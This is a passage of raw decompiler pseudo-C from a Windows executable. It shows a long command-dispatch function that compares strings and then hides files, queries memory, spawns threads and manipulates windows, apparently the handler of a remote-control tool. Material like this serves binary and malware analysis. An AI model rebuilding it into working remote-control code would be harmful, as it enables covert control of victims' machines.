       fcn.00405a48();\n            piStack952 = 0x47519d;\n            fcn.004059a4();\n            piStack952 = 0x4751a8;\n            fcn.00405504();\n            piStack952 = 0x4751b6;\n            fcn.0040a518();\n            piStack952 = 0x4751c4;\n            fcn.00405738();\n            piStack952 = 0x4751d2;\n            fcn.00464150();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack948;\n        }\n        piStack940 = &fcn.00472f6c::var_6d4h;\n        piStack944 = 0x475209;\n        fcn.00405964();\n        piStack944 = 0x475219;\n        fcn.00405894();\n        if (uVar10) {\n            piStack944 = 0x475231;\n            fcn.004059a4();\n            piStack948 = 0x47529c;\n            piStack952 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc48;\n            piStack956 = &fcn.00472f6c::var_40h;\n            piStack960 = 0x475250;\n            piStack944 = &stack0xfffffffc;\n            fcn.00405a48();\n            piStack960 = 0x475260;\n            fcn.00405964();\n            piStack960 = 0x47526d;\n            fcn.00405a48();\n            piStack960 = 0x47527c;\n            fcn.004059a4();\n            piStack960 = 0x475287;\n            fcn.00405504();\n            piStack960 = 0x475292;\n            fcn.00464150();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack956;\n        }\n        piStack948 = &fcn.00472f6c::var_6d8h;\n        piStack952 = 0x4752c9;\n        fcn.00405964();\n        piStack952 = 0x4752d9;\n        fcn.00405894();\n        if (uVar10) {\n            piStack956 = 0x475345;\n            piStack960 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc40;\n            var_33ch = var_4h;\n            if (var_4h != NULL) {\n                var_33ch = var_4h[-1];\n            }\n            piStack964 = &fcn.00472f6c::var_6dch;\n            piStack968 = 0x475326;\n            piStack952 = &stack0xfffffffc;\n            fcn.00405964();\n            piStack968 = 0x475331;\n            fcn.00464134();\n            piStack968 = 0x47533b;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack964;\n        }\n        piStack956 = &fcn.00472f6c::var_6e0h;\n        piStack960 = 0x475372;\n        fcn.00405964();\n        piStack960 = 0x475382;\n        fcn.00405894();\n        if (uVar10) {\n            piStack960 = 0x475396;\n            fcn.004059a4();\n            piStack964 = 0x4753e0;\n            piStack968 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc38;\n            puStack972 = 0x47c4b4;\n            piStack976 = var_4h;\n            piStack980 = 0x47c4c4;\n            piStack984 = 0x4753c1;\n            piStack960 = &stack0xfffffffc;\n            fcn.00405800();\n            piStack984 = 0x4753cc;\n            fcn.00463cc4();\n            piStack984 = 0x4753d6;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack980;\n        }\n        puStack972 = &fcn.00472f6c::var_6e8h;\n        piStack976 = 0x47540d;\n        fcn.00405964();\n        piStack976 = 0x47541d;\n        fcn.00405894();\n        if (uVar10) {\n            piStack980 = 0x475459;\n            piStack984 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc28;\n            puStack988 = 0x47543f;\n            piStack976 = &stack0xfffffffc;\n            fcn.004059a4();\n            puStack988 = 0x2;\n            piStack992 = 0x475449;\n            piStack992 = fcn.004058fc();\n            piStack996 = 0x47544f;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack992;\n        }\n        piStack984 = &fcn.00472f6c::var_6ech;\n        puStack988 = 0x475486;\n        fcn.00405964();\n        puStack988 = 0x475496;\n        fcn.00405894();\n        if (uVar10) {\n            piStack992 = 0x4754d5;\n            piStack996 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc1c;\n            puStack1000 = 0x4754b8;\n            puStack988 = &stack0xfffffffc;\n            fcn.004059a4();\n            puStack1000 = 0x80;\n            piStack1004 = 0x4754c5;\n            piStack1004 = fcn.004058fc();\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1004;\n        }\n        piStack996 = 0x4754f6;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1000 = 0x47558d;\n            piStack1004 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc14;\n            piStack996 = &stack0xfffffffc;\n            sub.kernel32.dll_GlobalMemoryStatus();\n            fcn.00465318();\n            fcn.00409ce8();\n            var_700h = var_38ch;\n            var_6fch = var_6fch & 0xffffff00;\n            piStack1028 = 0x475562;\n            fcn.0040af7c(&fcn.00472f6c::var_6f8h);\n            piStack1028 = var_6f8h;\n            uStack1032 = 0x475578;\n            fcn.00405800();\n            uStack1032 = 0x475583;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1028;\n        }\n        piStack996 = &fcn.00472f6c::var_704h;\n        puStack1000 = 0x4755ba;\n        fcn.00405964();\n        puStack1000 = 0x4755ca;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1000 = 0x4755e2;\n            fcn.004059a4();\n            puStack1000 = &fcn.00472f6c::var_8ch;\n            piStack1004 = 0x4755f6;\n            fcn.00405a48();\n            piStack1004 = 0x475606;\n            fcn.00405964();\n            piStack1004 = 0x475613;\n            fcn.00405a48();\n            piStack1004 = 0x475622;\n            fcn.004059a4();\n            piStack1004 = &fcn.00472f6c::var_90h;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.004054c0();\n            uVar10 = 1;\n            piStack1028 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbfc;\n            uStack1032 = 0xc;\n            uStack1036 = 0x40;\n            puStack1040 = 0x475742;\n            piStack1048 = sub.kernel32.dll_LocalAlloc_1();\n            puStack1040 = 0x475754;\n            fcn.00405894();\n            if (uVar10) {\n                puStack1040 = 0x47576f;\n                var_2f8h = piStack1048;\n                fcn.004054c0();\n                puStack1040 = 0x475783;\n                fcn.004054c0();\n                *(var_2f8h + 2) = 1;\n            }\n            else {\n                puStack1040 = 0x4757a8;\n                var_2fch = piStack1048;\n                fcn.004054c0();\n                puStack1040 = 0x4757bc;\n                fcn.004054c0();\n                *(var_2fch + 2) = 0;\n            }\n            *0x49253c = 0;\n            puStack1040 = &fcn.00472f6c::var_2b0h;\n            uStack1044 = 0;\n            pcStack1052 = fcn.004725b0;\n            puStack1056 = NULL;\n            puStack1060 = NULL;\n            piStack1064 = 0x4757e5;\n            piStack1064 = sub.kernel32.dll_CreateThread();\n            piStack1068 = 0x4757eb;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1064;\n        }\n        puStack1056 = 0x475816;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1064 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbd8;\n            *0x49253c = 1;\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1064;\n        }\n        puStack1056 = &fcn.00472f6c::var_708h;\n        puStack1060 = 0x475864;\n        fcn.00405964();\n        puStack1060 = 0x475874;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1064 = 0x4758ba;\n            piStack1068 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbd4;\n            piStack1072 = 0x47588f;\n            puStack1060 = &stack0xfffffffc;\n            fcn.0046548c();\n            piStack1072 = 0x4758a5;\n            fcn.00405784();\n            piStack1072 = 0x4758b0;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1068;\n        }\n        puStack1060 = &fcn.00472f6c::var_714h;\n        piStack1064 = 0x4758e7;\n        fcn.00405964();\n        piStack1064 = 0x4758f7;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1064 = 0x47590f;\n            fcn.004059a4();\n            piStack1068 = 0x475a1d;\n            piStack1072 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbd0;\n            puStack1076 = &fcn.00472f6c::var_1ch;\n            puStack1080 = 0x47592e;\n            piStack1064 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack1080 = 0x47593e;\n            fcn.00405964();\n            puStack1080 = 0x47594b;\n            fcn.00405a48();\n            puStack1080 = 0x47595a;\n            fcn.004059a4();\n            puStack1080 = &fcn.00472f6c::var_20h;\n            uStack1084 = 0x47596b;\n            fcn.00405a48();\n            uStack1084 = 0x47597b;\n            fcn.00405964();\n            uStack1084 = 0x475988;\n            fcn.00405a48();\n            uStack1084 = 0x475997;\n            fcn.004059a4();\n            uStack1084 = 0x4759a2;\n            fcn.00405504();\n            uStack1084 = 0x14;\n            uStack1088 = 0x40;\n            puStack1092 = 0x4759ab;\n            uStack1100 = sub.kernel32.dll_LocalAlloc_1();\n            puStack1092 = 0x4759ba;\n            fcn.00464824();\n            puStack1092 = 0x4759c7;\n            fcn.004054c0();\n            puStack1092 = 0x4759d2;\n            fcn.004054c0();\n            puStack1092 = 0x4759dd;\n            fcn.004054c0();\n            puStack1092 = 0x4759e8;\n            fcn.004054c0();\n            puStack1092 = 0x4759f5;\n            fcn.004054c0();\n            puStack1092 = &fcn.00472f6c::var_2b4h;\n            uStack1096 = 0;\n            pcStack1104 = fcn.00485178;\n            puStack1108 = NULL;\n            puStack1112 = NULL;\n            piStack1116 = 0x475a0d;\n            piStack1116 = sub.kernel32.dll_CreateThread();\n            puStack1120 = 0x475a13;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1116;\n        }\n        puStack1108 = &fcn.00472f6c::var_71ch;\n        puStack1112 = 0x475a4a;\n        fcn.00405964();\n        puStack1112 = 0x475a5a;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1112 = 0x475a72;\n            fcn.004059a4();\n            puStack1112 = &fcn.00472f6c::var_1ch;\n            piStack1116 = 0x475a83;\n            fcn.00405a48();\n            piStack1116 = 0x475a93;\n            fcn.00405964();\n            piStack1116 = 0x475aa0;\n            fcn.00405a48();\n            piStack1116 = 0x475aaf;\n            fcn.004059a4();\n            piStack1116 = &fcn.00472f6c::var_20h;\n            puStack1120 = 0x475ac0;\n            fcn.00405a48();\n            puStack1120 = 0x475ad0;\n            fcn.00405964();\n            puStack1120 = 0x475add;\n            fcn.00405a48();\n            puStack1120 = 0x475aec;\n            fcn.004059a4();\n            puStack1120 = &fcn.00472f6c::var_24h;\n            puStack1124 = 0x475afd;\n            fcn.00405a48();\n            puStack1124 = 0x475b0d;\n            fcn.00405964();\n            puStack1124 = 0x475b1a;\n            fcn.00405a48();\n            puStack1124 = 0x475b29;\n            fcn.004059a4();\n            uStack1128 = 0x475bba;\n            piStack1132 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb94;\n            uStack1136 = 0x14;\n            uStack1140 = 0x40;\n            puStack1144 = 0x475b40;\n            puStack1124 = &stack0xfffffffc;\n            uStack1152 = sub.kernel32.dll_LocalAlloc_1();\n            puStack1144 = 0x475b4c;\n            fcn.00409e54();\n            puStack1144 = 0x475b57;\n            fcn.004645e8();\n            puStack1144 = 0x475b64;\n            fcn.004054c0();\n            puStack1144 = 0x475b6f;\n            fcn.004054c0();\n            puStack1144 = 0x475b7a;\n            fcn.004054c0();\n            puStack1144 = 0x475b85;\n            fcn.004054c0();\n            puStack1144 = 0x475b92;\n            fcn.004054c0();\n            puStack1144 = &fcn.00472f6c::var_2b4h;\n            uStack1148 = 0;\n            pcStack1156 = fcn.00485178;\n            puStack1160 = NULL;\n            puStack1164 = NULL;\n            piStack1168 = 0x475baa;\n            piStack1168 = sub.kernel32.dll_CreateThread();\n            puStack1172 = 0x475bb0;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1168;\n        }\n        puStack1160 = &fcn.00472f6c::var_724h;\n        puStack1164 = 0x475be7;\n        fcn.00405964();\n        puStack1164 = 0x475bf7;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1164 = 0x475c0f;\n            fcn.004059a4();\n            puStack1164 = &fcn.00472f6c::var_9ch;\n            piStack1168 = 0x475c23;\n            fcn.00405a48();\n            piStack1168 = 0x475c33;\n            fcn.00405964();\n            piStack1168 = 0x475c40;\n            fcn.00405a48();\n            piStack1168 = 0x475c4f;\n            fcn.004059a4();\n            piStack1168 = 0x475c57;\n            iVar7 = fcn.00409e54();\n            puStack1172 = 0x475cfc;\n            piStack1176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb68;\n            piStack1168 = &stack0xfffffffc;\n            if (0 < iVar7) {\n                iVar3 = 1;\n                iVar9 = iVar7;\n                piStack1168 = &stack0xfffffffc;\n                do {\n                    if (iVar7 == iVar3) {\n                        piStack1180 = 0x475cdf;\n                        fcn.00409e54();\n                        piStack1180 = 0x475ce4;\n                        fcn.00463be0();\n                    }\n                    else {\n                        piStack1176 = &fcn.00472f6c::var_728h;\n                        piStack1184 = 0x475c8d;\n                        fcn.00405a48();\n                        piStack1184 = 0x475ca0;\n                        fcn.00405964();\n                        piStack1184 = 0x475cab;\n                        fcn.00409e54();\n                        piStack1184 = 0x475cb0;\n                        fcn.00463be0();\n                        piStack1184 = 0x475cc0;\n                        fcn.00405a48();\n                        piStack1184 = 0x475cd2;\n                        fcn.004059a4();\n                    }\n                    iVar3 = iVar3 + 1;\n                    iVar9 = iVar9 + -1;\n                } while (iVar9 != 0);\n            }\n            piStack1180 = 0x475cf2;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1176;\n        }\n        piStack1168 = &fcn.00472f6c::var_72ch;\n        puStack1172 = 0x475d29;\n        fcn.00405964();\n        puStack1172 = 0x475d39;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1172 = 0x475d4d;\n            fcn.004059a4();\n            piStack1176 = 0x475d7c;\n            piStack1180 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb64;\n            piStack1184 = 0x475d63;\n            puStack1172 = &stack0xfffffffc;\n            fcn.00409e54();\n            piStack1184 = 0x475d68;\n            fcn.00463be0();\n            piStack1184 = 0x475d72;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1180;\n        }\n        puStack1172 = &fcn.00472f6c::var_730h;\n        piStack1176 = 0x475da9;\n        fcn.00405964();\n        piStack1176 = 0x475db9;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1176 = 0x475dd1;\n            fcn.004059a4();\n            piStack1180 = 0x475fa4;\n            piStack1184 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb60;\n            puStack1188 = &fcn.00472f6c::var_a0h;\n            puStack1192 = 0x475df3;\n            piStack1176 = &stack0xfffffffc;\n            fcn.00405a48();\n            puStack1192 = 0x475e03;\n            fcn.00405964();\n            puStack1192 = 0x475e10;\n            fcn.00405a48();\n            puStack1192 = 0x475e1f;\n            fcn.004059a4();\n            puStack1192 = &fcn.00472f6c::var_a4h;\n            puStack1196 = 0x475e33;\n            fcn.00405a48();\n            puStack1196 = 0x475e43;\n            fcn.00405964();\n            puStack1196 = 0x475e50;\n            fcn.00405a48();\n            puStack1196 = 0x475e5f;\n            fcn.004059a4();\n            puStack1196 = &fcn.00472f6c::var_a8h;\n            puStack1200 = 0x475e73;\n            fcn.00405a48();\n            puStack1200 = 0x475e83;\n            fcn.00405964();\n            puStack1200 = 0x475e90;\n            fcn.00405a48();\n            puStack1200 = 0x475e9f;\n            fcn.004059a4();\n            puStack1200 = &fcn.00472f6c::var_ach;\n            uStack1204 = 0x475eb3;\n            fcn.00405a48();\n            uStack1204 = 0x475ec3;\n            fcn.00405964();\n            uStack1204 = 0x475ed0;\n            fcn.00405a48();\n            uStack1204 = 0x475edf;\n            fcn.004059a4();\n            uStack1204 = 0x475eed;\n            fcn.00405504();\n            uStack1204 = 0x14;\n            uStack1208 = 0x40;\n            piStack1212 = 0x475ef6;\n            uStack1232 = sub.kernel32.dll_LocalAlloc_1();\n            piStack1212 = 0x475f11;\n            fcn.0046575c();\n            piStack1212 = var_734h;\n            uStack1216 = 0x47bbe4;\n            puStack1220 = 0x475f33;\n            fcn.0046581c();\n            puStack1220 = var_738h;\n            puStack1224 = 0x475f45;\n            fcn.00405800();\n            puStack1224 = 0x475f53;\n            fcn.004054c0();\n            puStack1224 = 0x475f61;\n            fcn.004054c0();\n            puStack1224 = 0x475f6f;\n            fcn.004054c0();\n            puStack1224 = 0x475f7c;\n            fcn.004054c0();\n            puStack1224 = &fcn.00472f6c::var_2b4h;\n            uStack1228 = 0;\n            pcStack1236 = fcn.00485178;\n            puStack1240 = NULL;\n            puStack1244 = NULL;\n            piStack1248 = 0x475f94;\n            piStack1248 = sub.kernel32.dll_CreateThread();\n            piStack1252 = 0x475f9a;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1248;\n        }\n        puStack1240 = &fcn.00472f6c::var_73ch;\n        puStack1244 = 0x475fd1;\n        fcn.00405964();\n        puStack1244 = 0x475fe1;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1244 = 0x475ff9;\n            fcn.004059a4();\n            piStack1248 = 0x476084;\n            piStack1252 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb1c;\n            puStack1256 = &fcn.00472f6c::var_40h;\n            piStack1260 = 0x47601d;\n            puStack1244 = &stack0xfffffffc;\n            fcn.00405964();\n            piStack1260 = 0x47602f;\n            fcn.004059a4();\n            piStack1260 = &fcn.00472f6c::var_44h;\n            piStack1264 = 0x476040;\n            fcn.00405a48();\n            piStack1264 = 0x476050;\n            fcn.00405964();\n            piStack1264 = 0x47605d;\n            fcn.00405a48();\n            piStack1264 = 0x47606c;\n            fcn.004059a4();\n            piStack1264 = 0x47607a;\n            fcn.00464e58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1260;\n        }\n        piStack1252 = &fcn.00472f6c::var_740h;\n        puStack1256 = 0x4760b1;\n        fcn.00405964();\n        puStack1256 = 0x4760c1;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1260 = 0x47615a;\n            piStack1264 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb10;\n            puStack1268 = 0x4760e7;\n            puStack1256 = &stack0xfffffffc;\n            fcn.004059a4();\n            var_340h = var_4h;\n            if (var_4h != NULL) {\n                var_340h = var_4h[-1];\n            }\n            puStack1268 = &fcn.00472f6c::var_744h;\n            piStack1272 = 0x476124;\n            fcn.00405964();\n            piStack1272 = var_744h;\n            piStack1276 = &fcn.00472f6c::var_748h;\n            puStack1280 = 0x476144;\n            fcn.00405964();\n            piStack1276 = 0x476150;\n            fcn.00464fc0();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1272;\n        }\n        piStack1264 = &fcn.00472f6c::var_74ch;\n        puStack1268 = 0x476187;\n        fcn.00405964();\n        puStack1268 = 0x476197;\n        fcn.00405894();\n        if (uVar10) {\n            piStack1272 = 0x476230;\n            piStack1276 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffb04;\n            puStack1280 = 0x4761bd;\n            puStack1268 = &stack0xfffffffc;\n            fcn.004059a4();\n            var_344h = var_4h;\n            if (var_4h != NULL) {\n                var_344h = var_4h[-1];\n            }\n            puStack1280 = &fcn.00472f6c::var_750h;\n            piStack1284 = 0x4761fa;\n            fcn.00405964();\n            piStack1284 = var_750h;\n            piStack1288 = &fcn.00472f6c::var_754h;\n            fcn.00405964();\n            piStack1288 = 0x476226;\n            fcn.00464cd8();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack1284;\n        }\n        piStack1276 = &fcn.00472f6c::var_758h;\n        puStack1280 = 0x47625d;\n        fcn.00405964();\n        puStack1280 = 0x47626d;\n        fcn.00405894();\n        if (uVar10) {\n            puStack1280 = 0x476285;\n            fcn.004059a4();\n            piStack1284 = 0x476366;\n            piStack1288 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffaf8;\n            puStack1280 = &stack0xfffffffc;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            piStack1308 = 0x47635c;\n            piVar5 = var_4h;\n            fcn.00465dc8(var_4h);\n            uVar10 = 1;\n            *in_FS_OFFSET = piVar5;\n        }\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar10) {\n            fcn.004059a4();\n            piStack1308 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffae4;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            piStack1328 = 0x476492;\n            piVar5 = var_4h;\n            fcn.00465bfc(var_4h);\n            uVar10 = 1;\n            *in_FS_OFFSET = piVar5;\n        }\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar10) {\n            fcn.004059a4();\n            piStack1328 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffad0;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            uStack1348 = 0x4765c8;\n            piVar5 = var_4h;\n            fcn.00465ce4(var_4h);\n            uVar10 = 1;\n            *in_FS_OFFSET = piVar5;\n        }\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar10) {\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            uStack1348 = 0x476677;\n            fcn.00405a48();\n            uStack1348 = 0x476687;\n            fcn.00405964();\n            uStack1348 = 0x476694;\n            fcn.00405a48();\n            uStack1348 = 0x4766a3;\n            fcn.004059a4();\n            uStack1348 = 0x498840;\n            uStack1352 = 0x4766b5;\n            fcn.00405a48();\n            uStack1352 = 0x4766c5;\n            fcn.00405964();\n            uStack1352 = 0x4766d2;\n            fcn.00405a48();\n            uStack1352 = 0x4766e1;\n            fcn.004059a4();\n            uStack1352 = 0x498844;\n            ppiStack1356 = 0x4766f3;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            ppiStack1356 = 0x476703;\n            fcn.00405964();\n            ppiStack1356 = 0x476710;\n            fcn.00405a48();\n            ppiStack1356 = 0x47671f;\n            fcn.004059a4();\n            ppiStack1356 = 0x47672a;\n            fcn.00405504();\n            ppiStack1356 = 0x476737;\n            fcn.00405894();\n            if (uVar10) {\n                uVar10 = **0x492610 == NULL;\n                if (!uVar10) {\n                    var_348h = *0x498844;\n                    wParam = *0x498844;\n                    uVar10 = *0x498844 == NULL;\n                    if (!uVar10) {\n                        uVar10 = *0x498844 + -1 == NULL;\n                        wParam = (*0x498844)[-1];\n                    }\n                    ppiStack1356 = 0x476782;\n                    ppiStack1356 = fcn.004058fc();\n                    piStack1360 = wParam;\n                    uStack1364 = 6;\n                    pcStack1368 = **0x492610;\n                    uStack1372 = 0x476799;\n                    sub.user32.dll_PostThreadMessageW();\n                }\n            }\n            else {\n                ppiStack1356 = 0x4767a8;\n                fcn.00405894();\n                if ((uVar10) && (uVar10 = **0x492610 == NULL,  uVar10)) {\n                    ppiStack1356 = *0x492610;\n                    piStack1360 = NULL;\n                    uStack1364 = 0;\n                    pcStack1368 = fcn.0047e318;\n                    uStack1372 = 0;\n                    uStack1376 = 0;\n                    var_560h = 0x4767cc;\n                    sub.kernel32.dll_CreateThread();\n                    var_560h = 0x4767d6;\n                    fcn.00472b58();\n                }\n            }\n        }\n        var_560h = 0x4767e3;\n        fcn.00405894();\n        if ((uVar10) && (uVar10 = **0x492610 == NULL,  !uVar10)) {\n            var_560h = 0x4767ff;\n            fcn.00405664();\n            var_560h = lParam;\n            var_564h = 0x4;\n            var_568h = 6;\n            var_56ch = **0x492610;\n            var_570h = 0x476817;\n            sub.user32.dll_PostThreadMessageW();\n        }\n        var_560h = &fcn.00472f6c::var_76ch;\n        var_564h = 0x476830;\n        fcn.00405964();\n        var_564h = 0x476840;\n        fcn.00405894();\n        if (uVar10) {\n            var_564h = 0x476858;\n            fcn.004059a4();\n            var_568h = 0x4769df;\n            var_56ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_56ch;\n            var_570h = &fcn.00472f6c::var_1ch;\n            var_574h = 0x476877;\n            var_564h = &stack0xfffffffc;\n            fcn.00405a48();\n            var_574h = 0x476887;\n            fcn.00405964();\n            var_574h = 0x476894;\n            fcn.00405a48();\n            var_574h = 0x4768a3;\n            fcn.004059a4();\n            var_574h = &fcn.00472f6c::var_20h;\n            var_578h = 0x4768b4;\n            fcn.00405a48();\n            var_578h = 0x4768c4;\n            fcn.00405964();\n            var_578h = 0x4768d1;\n            fcn.00405a48();\n            var_578h = 0x4768e0;\n            fcn.004059a4();\n            var_578h = &fcn.00472f6c::var_24h;\n            var_57ch = 0x4768f1;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_57ch = 0x476901;\n            fcn.00405964();\n            var_57ch = 0x47690e;\n            fcn.00405a48();\n            var_57ch = 0x47691d;\n            fcn.004059a4();\n            var_57ch = 0x476928;\n            fcn.00405504();\n            var_57ch = 0x14;\n            var_580h = 0x40;\n            var_584h = 0x476931;\n            var_58ch = sub.kernel32.dll_LocalAlloc_1();\n            var_584h = 0x476942;\n            fcn.00405894();\n            if (uVar10) {\n                var_584h = 0x47694f;\n                fcn.00466320();\n                var_584h = var_770h;\n                var_588h = 0x476961;\n                fcn.004660f4();\n                var_584h = 0x47696f;\n                fcn.00405784();\n            }\n            else {\n                var_584h = 0x47697c;\n                fcn.004660f4();\n                var_584h = 0x476989;\n                fcn.004054c0();\n            }\n            var_584h = 0x476994;\n            fcn.004054c0();\n            var_584h = 0x47699f;\n            fcn.004054c0();\n            var_584h = 0x4769aa;\n            fcn.004054c0();\n            var_584h = 0x4769b7;\n            fcn.004054c0();\n            var_584h = &fcn.00472f6c::var_2b4h;\n            var_588h = 0;\n            var_590h = fcn.00485178;\n            var_594h = NULL;\n            var_598h = NULL;\n            var_59ch = 0x4769cf;\n            var_59ch = sub.kernel32.dll_CreateThread();\n            var_5a0h = 0x4769d5;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_59ch;\n        }\n        var_594h = &fcn.00472f6c::var_77ch;\n        var_598h = 0x476a0c;\n        fcn.00405964();\n        var_598h = 0x476a1c;\n        fcn.00405894();\n        if (uVar10) {\n            var_598h = 0x476a30;\n            fcn.004059a4();\n            var_59ch = 0x476a5c;\n            var_5a0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5a0h;\n            var_5a4h = 0;\n            var_5a8h = NULL;\n            var_5ach = 0x10;\n            var_5b0h = 0x476a4c;\n            var_598h = &stack0xfffffffc;\n            var_5b0h = fcn.00409e54();\n            var_5b4h = 0x476a52;\n            sub.user32.dll_SendMessageA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5b0h;\n        }\n        var_5a8h = &fcn.00472f6c::var_780h;\n        var_5ach = 0x476a7f;\n        fcn.00405964();\n        var_5ach = 0x476a8f;\n        fcn.00405894();\n        if (uVar10) {\n            var_5ach = 0x476aa3;\n            fcn.004059a4();\n            var_5b0h = 0x476acb;\n            var_5b4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5b4h;\n            var_5b8h = 0x3;\n            var_5bch = 0x476abb;\n            var_5ach = &stack0xfffffffc;\n            var_5bch = fcn.00409e54();\n            var_5c0h = 0x476ac1;\n            sub.user32.dll_ShowWindow();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5bch;\n        }\n        var_5b4h = &fcn.00472f6c::var_784h;\n        var_5b8h = 0x476aee;\n        fcn.00405964();\n        var_5b8h = 0x476afe;\n        fcn.00405894();\n        if (uVar10) {\n            var_5b8h = 0x476b12;\n            fcn.004059a4();\n            var_5bch = 0x476b3a;\n            var_5c0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5c0h;\n            var_5c4h = 0x6;\n            var_5c8h = 0x476b2a;\n            var_5b8h = &stack0xfffffffc;\n            var_5c8h = fcn.00409e54();\n            var_5cch = 0x476b30;\n            sub.user32.dll_ShowWindow();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5c8h;\n        }\n        var_5c0h = &fcn.00472f6c::var_788h;\n        var_5c4h = 0x476b5d;\n        fcn.00405964();\n        var_5c4h = 0x476b6d;\n        fcn.00405894();\n        if (uVar10) {\n            var_5c4h = 0x476b81;\n            fcn.004059a4();\n            var_5c8h = 0x476ba9;\n            var_5cch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5cch;\n            var_5d0h = NULL;\n            var_5d4h = 0x476b99;\n            var_5c4h = &stack0xfffffffc;\n            var_5d4h = fcn.00409e54();\n            var_5d8h = 0x476b9f;\n            sub.user32.dll_ShowWindow();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5d4h;\n        }\n        var_5cch = &fcn.00472f6c::var_78ch;\n        var_5d0h = 0x476bcc;\n        fcn.00405964();\n        var_5d0h = 